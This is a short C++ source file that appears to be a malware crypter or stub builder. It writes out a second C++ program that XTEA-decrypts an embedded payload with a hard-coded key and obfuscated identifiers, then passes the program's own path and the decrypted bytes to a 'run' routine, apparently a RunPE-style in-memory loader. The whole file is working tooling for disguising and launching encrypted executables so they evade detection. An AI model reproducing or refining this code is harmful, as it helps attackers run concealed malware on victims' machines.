#include <iostream>
#include <fstream>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

using namespace std;

char red[1000];
char txt[10000];

#define BLOCK_SIZE 8

void generate_shellcode(char argv[], char arg[])
{
    int i, j, c;

    freopen (arg,"w",stdout);
    printf("#include \"%s\"", argv);
	printf("#include <Windows.h>\n#include \"WhAkDM2s.h\"\n#define BLOCK_SIZE 8\n#include <stdint.h>\n");
	printf("unsigned int VDWpPXzs[4]={0xEF58,0x73A30,0x1FEBE,0x77C80};");
	printf("void mymemcpy(void *dest, void *src, size_t n){char *csrc = (char *) src;char *cdest= (char *) dest;char *temp = new char[n];for( int i=0; i<n; i++){temp[i]=csrc[i];}for(int i=0;i<n ; i++){cdest[i]= temp[i];}}");
	printf("void nyJSLDVu49(uint32_t v[2],uint32_t const VDWpPXzs[4]){unsigned int i;uint32_t v0=v[0],v1=v[1],delta=0x9E3779B9,sum=delta*32;for(i=0;i<32;i++){v1-=(((v0<<4)^(v0>>5))+v0)^(sum+VDWpPXzs[(sum>>11)&3]);sum-=delta;v0-=(((v1<<4)^(v1>>5))+v1)^(sum+VDWpPXzs[sum&3]);}v[0]=v0;v[1]=v1;}");
	printf("int main(){assignment();unsigned char kIpLo8YeEr[size*8];int n_blocks;n_blocks=size;if(size%8!=0)++n_blocks;unsigned char KTE0zNjkjs[8];for(int i=0;i<n_blocks;i++){mymemcpy(&KTE0zNjkjs,&at7SnZjX[i][0],8);nyJSLDVu49((uint32_t*)KTE0zNjkjs,VDWpPXzs);for(int j=0;j<8;j++)mymemcpy(&kIpLo8YeEr[(i*8)+j],&KTE0zNjkjs[j],sizeof(8));memset(KTE0zNjkjs,0,8);}WhAkDM2s rp;TCHAR szFilePath[1024];GetModuleFileNameA(0,LPSTR(szFilePath),1024);rp.run(LPSTR(szFilePath), kIpLo8YeEr);return 0;}");	
	fclose(stdout);
}

int main(int argc, char *argv[]){
    if (argc < 3) {
        fprintf(stderr, "Error : Please set a name");
        return 1;
    }
    generate_shellcode(argv[1], argv[2]);
    cout << "The cpp has been created !" << endl;
    system("pause");
    return (0);
}
